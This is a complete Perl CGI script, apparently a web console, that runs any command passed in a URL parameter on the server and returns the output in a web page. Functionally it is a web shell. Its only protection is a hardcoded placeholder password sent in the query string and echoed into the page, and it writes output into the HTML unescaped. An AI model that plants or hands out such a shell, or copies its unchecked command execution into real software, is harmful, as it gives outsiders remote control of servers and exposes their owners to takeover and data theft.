#!/usr/bin/perl
use CGI;
use Cwd;
print CGI::header( -type => 'text/html' );
my $command = CGI::param('command');
my $pwd = CGI::param('pwd') || '';
my $password = CGI::param('password');
my $filename = CGI->script_name() ;

if ( $password ne 'yourpassword' ) {
    print "Please provide a valid password.\n";
    exit(0)
}

$pwd = $pwd eq '' ? `pwd` : $pwd;
my $home = Cwd::cwd();
chdir($pwd);

my $result='';

if ($command =~ /^cd\s*(.*)/) {
  my $dir = $1 or '';
  if ($dir eq '') {
    chdir($home);
  } else {
    chdir($dir);
  }
  $pwd = Cwd::cwd(); 
  $result = `ls -la`;
} else {
  $result = `$command`;
}

print <<EOF;
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>
<meta content="text/html; charset=ISO-8859-1" http-equiv="content-type"><title>console</title>
<script>
window.onload = function(){
        document.getElementById("command").focus();
        }

</script>
<style type="text/css">
.wide1 {
border-width: thick;
width: 100%;
height: 600px;
}
.wide2 {
setFocus;
border-width: thick;
width: 100%;
}
</style>
</head><body>
<p>
Script: $filename PWD: $pwd <br/>
<textarea class="wide1" readonly="readonly" cols="1" rows="1" name="result">
$result
</textarea></p>
<form method="get" action="$filename" name="command">Command:&nbsp;
<input class="wide2" name="command" id="command"><br>
<input name="password" value="$password" type="hidden">
<input name="pwd" value="$pwd" type="hidden">
</form>
<br>
</body></html>
EOF

exit 0;
